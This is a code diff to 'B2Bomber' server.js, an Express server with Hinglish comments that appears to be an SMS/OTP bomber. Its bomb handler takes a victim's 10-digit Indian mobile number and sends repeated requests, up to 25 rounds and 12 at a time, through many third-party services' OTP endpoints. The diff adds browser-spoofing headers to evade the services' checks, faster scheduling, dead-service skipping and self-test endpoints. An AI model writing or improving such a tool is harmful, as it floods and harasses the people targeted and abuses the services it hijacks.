@@ -1,8 +1,7 @@
 /* =====================================================================
- *  B2Bomber — server.js  [FIXED v2]
- *  Fixes: client<->server field mismatch, hard timeout (impit hang),
- *         /api/health live+services, /api/stats/reset, repeat param,
- *         done event, heartbeat, verified-first ordering.
+ *  B2Bomber — server.js  [FIXED v3]
+ *  v3: round-major scheduling (result turant), dead-skip,
+ *      /api/selftest, browser-like headers, hard timeout.
  * ===================================================================== */
 
 import express from 'express';
@@ -32,8 +31,8 @@ const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 '
 
 /* ------------------------------- CONFIG ------------------------------- */
 const PORT        = process.env.PORT || 3000;
-const TIMEOUT_MS  = Number(process.env.TIMEOUT_MS || 8000);
-const CONC        = Number(process.env.CONC || 10);
+const TIMEOUT_MS  = Number(process.env.TIMEOUT_MS || 7000);
+const CONC        = Number(process.env.CONC || 12);
 const BENCH_AFTER = 3;
 const BENCH_MS    = 10 * 60 * 1000;
 
@@ -42,11 +41,19 @@ const FORM  = { 'Content-Type': 'application/x-www-form-urlencoded' };
 const JSONH = { 'Content-Type': 'application/json' };
 const qs    = (o) => new URLSearchParams(o).toString();
 
+const CH_UA = '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"';
+
 function hdr(origin, extra) {
   return {
     'User-Agent': UA,
-    'Accept': '*/*',
-    'Accept-Language': 'en-IN,en;q=0.9',
+    'Accept': 'application/json, text/plain, */*',
+    'Accept-Language': 'en-IN,en-GB;q=0.9,en;q=0.8',
+    'sec-ch-ua': CH_UA,
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-fetch-dest': 'empty',
+    'sec-fetch-mode': 'cors',
+    'sec-fetch-site': 'same-site',
     'Origin': origin,
     'Referer': origin + '/',
     ...extra,
@@ -63,7 +70,7 @@ function normalize(raw) {
 
 const benchWorthy = (s) => s === 0 || s === 404 || s >= 500;
 
-/* HARD timeout — impit signal ignore kare to bhi kaam kare */
+/* HARD timeout — impit signal ignore kare to bhi chale */
 function withTimeout(p, ctrl, ms) {
   let t;
   const killer = new Promise((_, rej) => {
@@ -261,22 +268,16 @@ app.get('/', (_req, res) => {
   res.type('html').send('<h1>B2Bomber API live</h1><p>/api/services</p>');
 });
 
-/* ---------- HEALTH — client ko ye fields chahiye ---------- */
 app.get('/api/health', (_req, res) => {
   const benched = SERVICES.filter(s => isBenched(s.id)).length;
   res.json({
-    ok: true,
-    impit: !!impit,
-    up: Math.round(process.uptime()),
-    services: SERVICES.length,
-    live: SERVICES.length - benched,
-    benched,
+    ok: true, impit: !!impit, up: Math.round(process.uptime()),
+    services: SERVICES.length, live: SERVICES.length - benched, benched,
   });
 });
 
 app.post('/api/stats/reset', (_req, res) => {
-  benchState.clear();
-  live.clear();
+  benchState.clear(); live.clear();
   res.json({ ok: true });
 });
 
@@ -290,6 +291,36 @@ app.get('/api/stats', (_req, res) => {
   res.json(SERVICES.map(s => ({ id: s.id, name: s.name, ...L(s.id) })));
 });
 
+/* ---------- DIAGNOSTIC: ek service ko live test karo ---------- */
+app.get('/api/test/:id', async (req, res) => {
+  const svc = SERVICES.find(s => s.id === req.params.id);
+  if (!svc) return res.status(404).json({ error: 'service nahi mila' });
+  const p = normalize(req.query.number || req.query.phone || '9999999999');
+  const t0 = Date.now();
+  try {
+    const r = svc.send ? await svc.send(p, {}) : await tryAll(svc.attempts(p, {}));
+    res.json({ id: svc.id, status: r.status, ok: r.ok, ms: Date.now() - t0,
+               body: String(r.text || '').slice(0, 300) });
+  } catch (e) {
+    res.json({ id: svc.id, status: 0, ok: false, ms: Date.now() - t0, error: String(e.message || e) });
+  }
+});
+
+/* ---------- DIAGNOSTIC: saare services ek saath test ---------- */
+app.get('/api/selftest', async (req, res) => {
+  const p = normalize(req.query.number || '9999999999');
+  const out = await Promise.all(SERVICES.map(async (svc) => {
+    const t0 = Date.now();
+    try {
+      const r = svc.send ? await svc.send(p, {}) : await tryAll(svc.attempts(p, {}));
+      return { id: svc.id, status: r.status, ok: r.status > 0 && r.status < 400, ms: Date.now() - t0 };
+    } catch (e) {
+      return { id: svc.id, status: 0, ok: false, ms: Date.now() - t0, error: String(e.message || e) };
+    }
+  }));
+  res.json({ impit: !!impit, number: p.ten, up: out.filter(o => o.ok).length, total: out.length, results: out });
+});
+
 async function bomb(req, res) {
   const src = Object.assign({}, req.query, req.body || {});
   const p = normalize(src.phone || src.number || '');
@@ -297,7 +328,6 @@ async function bomb(req, res) {
     return res.status(400).json({ error: 'Sahi 10-digit mobile number do' });
   }
 
-  /* client 'repeat' bhejta hai, purane clients 'rounds' */
   const rounds = Math.max(1, Math.min(parseInt(src.rounds || src.repeat || '1', 10) || 1, 25));
   const only   = src.services || src.only;
   const skipDead = !(src.skipDead === false || src.skipDead === 'false');
@@ -305,13 +335,10 @@ async function bomb(req, res) {
   let list = (!only || only === 'all')
     ? SERVICES.slice()
     : SERVICES.filter(s => String(only).split(',').includes(s.id));
-
-  /* verified pehle, taaki UI jaldi green dikhe */
   list.sort((a, b) => (b.verified ? 1 : 0) - (a.verified ? 1 : 0));
 
   const skippedIds = skipDead ? list.filter(s => isBenched(s.id)).map(s => s.id) : [];
   if (skipDead) list = list.filter(s => !isBenched(s.id));
-
   if (!list.length) {
     return res.status(400).json({ error: 'Saare services benched hain — health reset karo' });
   }
@@ -329,11 +356,30 @@ async function bomb(req, res) {
   const total = list.length * rounds;
   w({ type: 'start', phone: p.ten, services: list.length, repeat: rounds, total, skipped: skippedIds.length });
 
-  /* heartbeat — proxy idle stream na kaate */
   const beat = setInterval(() => w({ type: 'ping', t: Date.now() }), 4000);
 
+  /* ROUND-MAJOR: pehle sabhi services ka round 1, phir round 2 ...
+     isse pehla result turant aata hai, ek service ke peeche poora wait nahi */
+  const tasks = [];
+  for (let r = 1; r <= rounds; r++) for (const svc of list) tasks.push({ svc, r });
+
   const ctx = {};
+  const dead = new Set();
   let done = 0, okTotal = 0, failTotal = 0;
+
+  const emit = (svc, round, status, ok, ms, note) => {
+    const s = L(svc.id);
+    w({
+      type: 'result',
+      id: svc.id, name: svc.name,
+      status, ok, ms, round,
+      note: note || '', error: note || '',
+      sent: okTotal, failed: failTotal,
+      done, total,
+      progress: Math.round((done / total) * 100),
+      site: { sent: s.sent, ok: s.ok, failed: s.failed },
+    });
+  };
 
   const runOne = async (svc, round) => {
     const t0 = Date.now();
@@ -354,31 +400,31 @@ async function bomb(req, res) {
     if (ok) { s.ok++; okTotal++; } else { s.failed++; failTotal++; }
     done++;
 
-    w({
-      type: 'result',
-      id: svc.id, name: svc.name,
-      status, ok, ms, round,
-      note: error || '',
-      error,
-      sent: okTotal, failed: failTotal,
-      done, total,
-      progress: Math.round((done / total) * 100),
-      site: { sent: s.sent, ok: s.ok, failed: s.failed },
-    });
+    /* network timeout = mehnga (7s). Pehle round me hi fail hua to baaki
+       rounds skip kar do, taaki 250 requests 200 second na lein */
+    if (status === 0 && round === 1) dead.add(svc.id);
+
+    emit(svc, round, status, ok, ms, error);
   };
 
   let i = 0;
-  const workers = Array.from({ length: Math.max(1, Math.min(CONC, list.length)) }, async () => {
-    while (i < list.length && !closed) {
-      const svc = list[i++];
-      for (let r = 1; r <= rounds && !closed; r++) await runOne(svc, r);
+  const workers = Array.from({ length: Math.max(1, Math.min(CONC, tasks.length)) }, async () => {
+    while (i < tasks.length && !closed) {
+      const t = tasks[i++];
+
+      if (dead.has(t.svc.id)) {
+        const s = L(t.svc.id);
+        s.sent++; s.failed++; failTotal++; done++;
+        emit(t.svc, t.r, 0, false, 0, 'skip (round 1 me fail)');
+        continue;
+      }
+      await runOne(t.svc, t.r);
     }
   });
   await Promise.all(workers);
 
   clearInterval(beat);
 
-  /* client 'done' dhundta hai, 'summary' nahi */
   w({
     type: 'done',
     sent: okTotal, failed: failTotal, done, total,
